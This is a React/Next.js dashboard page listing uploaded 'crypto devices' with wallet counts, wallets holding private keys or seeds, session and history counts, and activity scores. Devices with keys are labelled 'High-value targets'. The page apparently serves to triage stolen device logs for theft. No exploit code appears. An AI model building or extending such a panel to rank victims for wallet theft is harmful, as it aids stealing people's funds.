"use client"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
import { ScrollArea } from "@/components/ui/scroll-area"
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select"
import {
  Wallet,
  TrendingUp,
  Filter,
  Download,
  ExternalLink,
  Key,
  Coins,
  Activity,
  AlertTriangle,
  CheckCircle,
  Search,
  RefreshCw
} from "lucide-react"
import { toast } from "sonner"

interface CryptoDevice {
  device_id: string
  device_name: string
  upload_date: string
  upload_batch: string
  wallet_count: number
  wallets_with_keys: number
  blockchain_count: number
  wallet_type_count: number
  blockchains: string[]
  wallet_names: string[]
  crypto_history_count: number
  crypto_sessions_count: number
  crypto_software_count: number
  crypto_activity_score: number
}

interface CryptoDevicesStats {
  total_devices: number
  total_wallets: number
  devices_with_keys: number
  unique_blockchains: number
  avg_activity_score: number
  high_activity_devices: number
  medium_activity_devices: number
  low_activity_devices: number
}

export default function CryptoDevicesPage() {
  const router = useRouter()
  const [devices, setDevices] = useState<CryptoDevice[]>([])
  const [stats, setStats] = useState<CryptoDevicesStats | null>(null)
  const [loading, setLoading] = useState(true)

  // Filters
  const [minWallets, setMinWallets] = useState("0")
  const [minActivityScore, setMinActivityScore] = useState("0")
  const [hasKeys, setHasKeys] = useState("all")
  const [blockchain, setBlockchain] = useState("all")
  const [searchQuery, setSearchQuery] = useState("")

  useEffect(() => {
    fetchDevices()
  }, [minWallets, minActivityScore, hasKeys, blockchain])

  const fetchDevices = async () => {
    setLoading(true)
    try {
      const params = new URLSearchParams({
        min_wallets: minWallets,
        min_activity_score: minActivityScore,
        limit: "100"
      })

      if (hasKeys !== "all") {
        params.append("has_keys", hasKeys)
      }

      if (blockchain !== "all") {
        params.append("blockchain", blockchain)
      }

      const response = await fetch(`/api/v1/crypto/devices?${params}`)
      const data = await response.json()

      if (data.success) {
        setDevices(data.devices || [])
        setStats(data.stats)
      } else {
        toast.error(data.error || "Failed to load crypto devices")
      }
    } catch (error) {
      console.error("Error fetching crypto devices:", error)
      toast.error("Error loading crypto devices")
    } finally {
      setLoading(false)
    }
  }

  const getActivityLevelBadge = (score: number) => {
    if (score >= 70) return { label: "Very High", variant: "destructive" as const, color: "bg-red-500" }
    if (score >= 40) return { label: "High", variant: "default" as const, color: "bg-orange-500" }
    if (score >= 20) return { label: "Medium", variant: "secondary" as const, color: "bg-yellow-500" }
    return { label: "Low", variant: "outline" as const, color: "bg-green-500" }
  }

  const exportToCSV = () => {
    if (devices.length === 0) {
      toast.error("No devices to export")
      return
    }

    const headers = [
      "Device ID", "Device Name", "Upload Date", "Wallets", "Wallets with Keys",
      "Blockchains", "Activity Score", "History Count", "Sessions Count", "Software Count"
    ]

    const rows = devices.map(device => [
      device.device_id,
      device.device_name,
      new Date(device.upload_date).toLocaleDateString(),
      device.wallet_count,
      device.wallets_with_keys,
      device.blockchains.join("; "),
      device.crypto_activity_score,
      device.crypto_history_count,
      device.crypto_sessions_count,
      device.crypto_software_count
    ])

    const csv = [
      headers.join(","),
      ...rows.map(row => row.map(cell => `"${cell}"`).join(","))
    ].join("\n")

    const blob = new Blob([csv], { type: "text/csv" })
    const url = URL.createObjectURL(blob)
    const a = document.createElement("a")
    a.href = url
    a.download = `crypto-devices-${Date.now()}.csv`
    a.click()
    URL.revokeObjectURL(url)
    toast.success("Exported crypto devices to CSV")
  }

  const filteredDevices = devices.filter(device => {
    if (!searchQuery) return true
    const query = searchQuery.toLowerCase()
    return (
      device.device_name.toLowerCase().includes(query) ||
      device.device_id.toLowerCase().includes(query) ||
      device.wallet_names.some(name => name.toLowerCase().includes(query))
    )
  })

  // Get unique blockchains from all devices for filter dropdown
  const uniqueBlockchains = Array.from(
    new Set(devices.flatMap(d => d.blockchains.filter(b => b)))
  ).sort()

  return (
    <div className="container mx-auto p-6 space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-3xl font-bold flex items-center gap-2">
            <Coins className="h-8 w-8 text-orange-500" />
            Crypto Devices
          </h1>
          <p className="text-muted-foreground mt-1">
            {stats ? `${stats.total_devices} devices with crypto activity` : "Loading..."}
          </p>
        </div>
        <div className="flex gap-2">
          <Button variant="outline" onClick={fetchDevices} disabled={loading}>
            <RefreshCw className={`h-4 w-4 mr-2 ${loading ? "animate-spin" : ""}`} />
            Refresh
          </Button>
          <Button variant="outline" onClick={exportToCSV}>
            <Download className="h-4 w-4 mr-2" />
            Export CSV
          </Button>
        </div>
      </div>

      {/* Statistics Overview */}
      {stats && (
        <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-4">
          <Card>
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium">Total Devices</CardTitle>
              <Wallet className="h-4 w-4 text-muted-foreground" />
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold">{stats.total_devices}</div>
              <p className="text-xs text-muted-foreground">
                {stats.total_wallets} total wallets
              </p>
            </CardContent>
          </Card>

          <Card>
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium">With Private Keys</CardTitle>
              <Key className="h-4 w-4 text-red-500" />
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold text-red-500">{stats.devices_with_keys}</div>
              <p className="text-xs text-muted-foreground">
                High-value targets
              </p>
            </CardContent>
          </Card>

          <Card>
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium">Avg Activity Score</CardTitle>
              <Activity className="h-4 w-4 text-muted-foreground" />
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold">{stats.avg_activity_score.toFixed(0)}/100</div>
              <p className="text-xs text-muted-foreground">
                {stats.unique_blockchains} blockchains detected
              </p>
            </CardContent>
          </Card>

          <Card>
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium">Activity Distribution</CardTitle>
              <TrendingUp className="h-4 w-4 text-muted-foreground" />
            </CardHeader>
            <CardContent>
              <div className="flex gap-2 text-sm">
                <span className="text-red-500 font-semibold">{stats.high_activity_devices}H</span>
                <span className="text-orange-500 font-semibold">{stats.medium_activity_devices}M</span>
                <span className="text-green-500 font-semibold">{stats.low_activity_devices}L</span>
              </div>
              <p className="text-xs text-muted-foreground">High / Medium / Low</p>
            </CardContent>
          </Card>
        </div>
      )}

      {/* Filters */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Filter className="h-5 w-5" />
            Filters
          </CardTitle>
          <CardDescription>Filter devices by crypto activity criteria</CardDescription>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-1 md:grid-cols-5 gap-4">
            <div className="relative">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
              <Input
                placeholder="Search devices..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="pl-10"
              />
            </div>

            <Select value={minWallets} onValueChange={setMinWallets}>
              <SelectTrigger>
                <SelectValue placeholder="Min wallets" />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="0">All Devices</SelectItem>
                <SelectItem value="1">1+ Wallets</SelectItem>
                <SelectItem value="3">3+ Wallets</SelectItem>
                <SelectItem value="5">5+ Wallets</SelectItem>
                <SelectItem value="10">10+ Wallets</SelectItem>
              </SelectContent>
            </Select>

            <Select value={hasKeys} onValueChange={setHasKeys}>
              <SelectTrigger>
                <SelectValue placeholder="Key status" />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="all">All Devices</SelectItem>
                <SelectItem value="true">Has Keys/Seeds</SelectItem>
                <SelectItem value="false">Addresses Only</SelectItem>
              </SelectContent>
            </Select>

            <Select value={blockchain} onValueChange={setBlockchain}>
              <SelectTrigger>
                <SelectValue placeholder="Blockchain" />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="all">All Blockchains</SelectItem>
                {uniqueBlockchains.map(chain => (
                  <SelectItem key={chain} value={chain}>{chain}</SelectItem>
                ))}
              </SelectContent>
            </Select>

            <Select value={minActivityScore} onValueChange={setMinActivityScore}>
              <SelectTrigger>
                <SelectValue placeholder="Activity level" />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="0">All Activity</SelectItem>
                <SelectItem value="20">Medium+ (20+)</SelectItem>
                <SelectItem value="40">High+ (40+)</SelectItem>
                <SelectItem value="70">Very High (70+)</SelectItem>
              </SelectContent>
            </Select>
          </div>
        </CardContent>
      </Card>

      {/* Devices Table */}
      <Card>
        <CardHeader>
          <CardTitle>Devices ({filteredDevices.length})</CardTitle>
          <CardDescription>
            Click on a device to view detailed crypto analysis
          </CardDescription>
        </CardHeader>
        <CardContent>
          {loading ? (
            <div className="flex items-center justify-center h-64">
              <div className="text-center">
                <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary mx-auto mb-4" />
                <p className="text-sm text-muted-foreground">Loading crypto devices...</p>
              </div>
            </div>
          ) : filteredDevices.length === 0 ? (
            <div className="flex flex-col items-center justify-center h-64 text-center">
              <Wallet className="h-12 w-12 text-muted-foreground mb-4" />
              <h3 className="text-lg font-semibold mb-2">No Crypto Devices Found</h3>
              <p className="text-sm text-muted-foreground max-w-md">
                No devices match your current filters. Try adjusting the filter criteria or uploading more data.
              </p>
            </div>
          ) : (
            <ScrollArea className="h-[600px]">
              <Table>
                <TableHeader className="sticky top-0 bg-background z-10">
                  <TableRow>
                    <TableHead>Device</TableHead>
                    <TableHead>Wallets</TableHead>
                    <TableHead>Blockchains</TableHead>
                    <TableHead>Activity Score</TableHead>
                    <TableHead>History</TableHead>
                    <TableHead>Sessions</TableHead>
                    <TableHead>Upload Date</TableHead>
                    <TableHead>Actions</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {filteredDevices.map((device) => {
                    const activityBadge = getActivityLevelBadge(device.crypto_activity_score)
                    return (
                      <TableRow
                        key={device.device_id}
                        className="cursor-pointer hover:bg-muted/50"
                        onClick={() => router.push(`/crypto-analysis/${device.device_id}`)}
                      >
                        <TableCell>
                          <div>
                            <div className="font-medium flex items-center gap-2">
                              <Wallet className="h-4 w-4 text-orange-500" />
                              {device.device_name}
                            </div>
                            <div className="text-xs text-muted-foreground">
                              {device.device_id}
                            </div>
                          </div>
                        </TableCell>
                        <TableCell>
                          <div className="flex flex-col gap-1">
                            <Badge variant="secondary" className="w-fit">
                              {device.wallet_count} total
                            </Badge>
                            {device.wallets_with_keys > 0 && (
                              <Badge variant="destructive" className="w-fit flex items-center gap-1">
                                <Key className="h-3 w-3" />
                                {device.wallets_with_keys} with keys
                              </Badge>
                            )}
                          </div>
                        </TableCell>
                        <TableCell>
                          <div className="flex flex-wrap gap-1">
                            {device.blockchains.length > 0 ? (
                              device.blockchains.slice(0, 3).map((chain, idx) => (
                                <Badge key={idx} className="bg-blue-500/10 text-blue-500 border-blue-500/20">
                                  {chain}
                                </Badge>
                              ))
                            ) : (
                              <span className="text-xs text-muted-foreground">None</span>
                            )}
                            {device.blockchains.length > 3 && (
                              <Badge variant="outline">+{device.blockchains.length - 3}</Badge>
                            )}
                          </div>
                        </TableCell>
                        <TableCell>
                          <div className="flex items-center gap-2">
                            <div className="flex-1">
                              <div className="h-2 bg-muted rounded-full overflow-hidden">
                                <div
                                  className={`h-full ${activityBadge.color}`}
                                  style={{ width: `${device.crypto_activity_score}%` }}
                                />
                              </div>
                            </div>
                            <Badge variant={activityBadge.variant} className="min-w-[80px] justify-center">
                              {device.crypto_activity_score}
                            </Badge>
                          </div>
                        </TableCell>
                        <TableCell>
                          <Badge variant="outline">{device.crypto_history_count}</Badge>
                        </TableCell>
                        <TableCell>
                          <Badge variant="outline">{device.crypto_sessions_count}</Badge>
                        </TableCell>
                        <TableCell className="text-sm text-muted-foreground">
                          {new Date(device.upload_date).toLocaleDateString()}
                        </TableCell>
                        <TableCell>
                          <div className="flex gap-2">
                            <Button
                              variant="ghost"
                              size="sm"
                              onClick={(e) => {
                                e.stopPropagation()
                                router.push(`/crypto-analysis/${device.device_id}`)
                              }}
                            >
                              <TrendingUp className="h-4 w-4" />
                            </Button>
                            <Button
                              variant="ghost"
                              size="sm"
                              onClick={(e) => {
                                e.stopPropagation()
                                router.push(`/devices/${device.device_id}`)
                              }}
                            >
                              <ExternalLink className="h-4 w-4" />
                            </Button>
                          </div>
                        </TableCell>
                      </TableRow>
                    )
                  })}
                </TableBody>
              </Table>
            </ScrollArea>
          )}
        </CardContent>
      </Card>
    </div>
  )
}
